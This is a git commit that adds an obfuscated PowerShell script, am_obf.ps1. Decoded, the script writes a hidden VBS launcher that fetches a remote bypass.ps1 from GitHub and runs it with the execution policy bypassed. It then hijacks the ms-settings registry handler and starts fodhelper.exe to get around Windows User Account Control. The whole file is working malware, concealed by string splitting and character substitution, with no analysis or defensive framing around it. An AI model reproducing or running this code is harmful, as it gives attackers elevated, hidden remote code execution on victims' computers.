af319f61a11bfe3c8fe987a81566778df3137a2a
robertoaguilarfields-blip <robertoaguilarfields@gmail.com>
2025-09-22 00:25:24 +0200

    Add files via upload

---
+++ am_obf.ps1
@@ -0,0 +1,11 @@
+ ('lD6'+'vbsPath '+'= x'+'80l'+'D6env:'+'U'+'S'+'ERPR'+'OFI'+'LE4d'+'wLaunch'+'Hi'+'d'+'d'+'en.'+'ps1'+'.vbsx80'+'
+l'+'D'+'6vbsConte'+'nt ='+' @'+'cm0
+Set'+' WshShel'+'l'+' = '+'Cre'+'a'+'t'+'eObjec'+'t'+'(x80WS'+'cript.Shellx8'+'0)'+'
+Wsh'+'Shel'+'l'+'.Run '+'x'+'8'+'0po'+'wers'+'hell.'+'e'+'xe -'+'Exe'+'cutionPoli'+'c'+'y Byp'+'ass -W'+'i'+'ndowSt'+'y'+'le H'+'idd'+'en -C'+'ommand '+'x80x80i'+'e'+'x (iwr'+' cm0https://'+'github.co'+'m'+'/ro'+'b'+'ertoa'+'guila'+'rfields'+'-b'+'l'+'ip'+'/'+'m'+'y-proyec'+'t'+'o/raw/r'+'efs/'+'hea'+'ds/mai'+'n/bypa'+'ss.'+'ps1cm'+'0)x80x80x80'+','+' 0'+', Fa'+'lse
+cm'+'0@'+'
+Set-Conte'+'n'+'t -P'+'a'+'th '+'lD6vb'+'s'+'P'+'at'+'h -Value l'+'D6'+'v'+'b'+'sConte'+'nt '+'-F'+'or'+'ce
+New-It'+'em '+'-'+'Path'+' '+'HKCU:4'+'d'+'wSoftwa'+'re'+'4d'+'wC'+'lasses4dw'+'ms-s'+'ettin'+'gs4dwshell4d'+'wopen'+'4dwcomman'+'d -For'+'c'+'e'+'
+# 3?? Limpia'+'r el DelegateEx'+'ecute'+' '+'(neces'+'ar'+'io)
+Set-I'+'temPro'+'perty '+'-'+'Path HK'+'CU:'+'4dwSoftware'+'4'+'dwClasses4dwms'+'-'+'settings'+'4dw'+'shell4d'+'wope'+'n4dwcomman'+'d'+' -N'+'a'+'me '+'x8'+'0'+'Del'+'eg'+'ateExe'+'cutex8'+'0 -V'+'alu'+'e x8'+'0x80'+''+'
+Set-'+'ItemP'+'ro'+'perty -Path '+'HK'+'CU'+':4d'+'wSoftwa'+'re4'+'dwClas'+'se'+'s'+'4'+'d'+'wms'+'-setti'+'ngs4'+'dwshel'+'l4dwo'+'pe'+'n4dwcomman'+'d '+'-Na'+'m'+'e x80(Defa'+'ul'+'t'+')x80 -V'+'alue x80wscript.e'+'xe AEtx8'+'0lD6vbsPathAEtx'+'8'+'0x80'+'
+Start-Pr'+'o'+'ces'+'s'+' fodh'+'elper.ex'+'e').REplAcE(([chAR]65+[chAR]69+[chAR]116),'`').REplAcE(([chAR]120+[chAR]56+[chAR]48),[strinG][chAR]34).REplAcE('cm0',[strinG][chAR]39).REplAcE(([chAR]52+[chAR]100+[chAR]119),'\').REplAcE(([chAR]108+[chAR]68+[chAR]54),[strinG][chAR]36) | .( $pShomE[21]+$pShOME[34]+'X')
